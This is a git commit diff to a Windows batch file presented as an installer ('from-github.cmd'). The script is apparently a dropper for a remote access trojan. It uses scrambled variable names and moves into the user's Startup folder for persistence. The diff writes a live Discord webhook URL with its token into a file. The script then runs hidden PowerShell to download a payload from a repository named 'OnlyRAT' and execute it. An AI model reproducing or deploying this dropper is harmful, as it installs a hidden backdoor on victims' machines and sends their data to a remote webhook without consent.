075c1163f8bb0674c28f4cff2cd6fda4cf6257d3
mushruumisamunch <136205422+mushruumisamunch@users.noreply.github.com>
2024-05-12 14:45:29 -0600

    Update from-github.cmd

--- installers/from-github.cmd
+++ installers/from-github.cmd
@@ -2,7 +2,7 @@
 set "XNjFYKECht=%cd%"
 set "YKHfpmMRoQ=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 cd %YKHfpmMRoQ%
-echo DISCORDWEBHOOK > lawFvVTikZ.txt
+echo https://discord.com/api/webhooks/1239315922292834356/jPRqRgLoAtLAW3Ev7x2JGxJyFT3b898Nb1Dlzdlj3tj3UmAU3uqguAnqlcLNl0COBeXm > lawFvVTikZ.txt
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/CosmodiumCS/MK01-OnlyRAT/main/payloads/g1.cmd -o wEaoFkNduy.cmd"
 powershell ./wEaoFkNduy.cmd
 cd "%XNjFYKECht%"
